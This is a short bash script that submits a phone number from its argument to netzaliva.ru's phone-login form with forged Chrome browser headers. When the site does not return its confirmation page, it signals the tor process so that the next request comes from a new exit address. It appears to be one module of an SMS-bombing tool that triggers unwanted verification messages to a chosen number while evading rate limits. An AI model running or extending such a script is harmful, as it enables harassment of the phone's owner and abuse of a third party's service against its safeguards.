#!/bin/bash

PHONE="$(echo "$1" | sed -E 's/^\+([0-9]{1,2})([0-9]{3})([0-9]{3})([0-9]{4})$/\1%28\2%29\3-\4/')"

echo "+$PHONE"

RESULT=$(curl -s --retry 3 'https://netzaliva.ru/LoginReg/LoginFormPhone.php'    \
-H 'authority: netzaliva.ru'    \
-H 'cache-control: max-age=0'    \
-H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"'    \
-H 'sec-ch-ua-mobile: ?0'    \
-H 'sec-ch-ua-platform: "Windows"'    \
-H 'origin: https://netzaliva.ru'    \
-H 'upgrade-insecure-requests: 1'    \
-H 'dnt: 1'    \
-H 'content-type: application/x-www-form-urlencoded'    \
-H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'    \
-H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'    \
-H 'sec-fetch-site: same-origin'    \
-H 'sec-fetch-mode: navigate'    \
-H 'sec-fetch-user: ?1'    \
-H 'sec-fetch-dest: document'    \
-H 'referer: https://netzaliva.ru/LoginReg/LoginFormPhone.php'    \
-H 'accept-language: ru-UA,ru;q=0.9'   \
--data-raw "PhoneNumber=%2B$PHONE")

if [ "$(echo "$RESULT" | grep -c 'LoginFormPhoneConfirm')" = "0" ]; then
  echo "$RESULT"
  echo "false"
  pkill -sighup tor 2>/dev/null
else
  echo "true"
fi
